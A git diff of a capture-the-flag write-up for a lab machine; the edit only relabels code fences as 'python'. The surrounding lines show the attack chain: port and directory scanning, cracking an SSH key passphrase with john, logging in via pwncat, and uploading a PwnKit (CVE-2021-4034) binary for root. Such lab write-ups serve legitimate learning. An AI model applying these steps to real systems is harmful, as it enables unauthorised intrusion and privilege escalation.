@@ -18,7 +18,7 @@ As always we start with rustscan I like its style and it instantly gives a respo
 rustscan  $IP -- -A -sC -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -166,7 +166,7 @@ I wonder what's hidden on this web server. let's dig it..........
 gobuster dir -u http://10.10.204.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,zip,html | tee gobuster.log
 ````````
 
-````````
+````````python
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -219,7 +219,7 @@ Now it's time to crack the bad boy.......
 john id_rsa --wordlist=/usr/share/wordlists/rockyou.txt
 ````````
 
-````````
+````````python
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -240,7 +240,7 @@ So, we have successfully Cracked it. now let us login into our target machine
 pwncat-cs john@$IP -i id_rsa 
 ````````
 
-````````
+````````python
 [22:13:23] Welcome to pwncat 🐈!                                                                                                               __main__.py:164
 Private Key Passphrase: *******
 [22:13:32] 10.10.204.134:22: registered new host w/ db                                                                                          manager.py:957
@@ -257,7 +257,7 @@ user.txt
 
 ### Privilage Esculation (Getting Root.txt)
 
-````````
+````````python
 (local) pwncat$ upload /opt/CVE-2021-4034/PwnKit
 ./PwnKit ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 14.7/14.7 KB • ? • 0:00:00
 [22:42:05] uploaded 14.69KiB in 1.80 seconds                                                                                                      upload.py:76
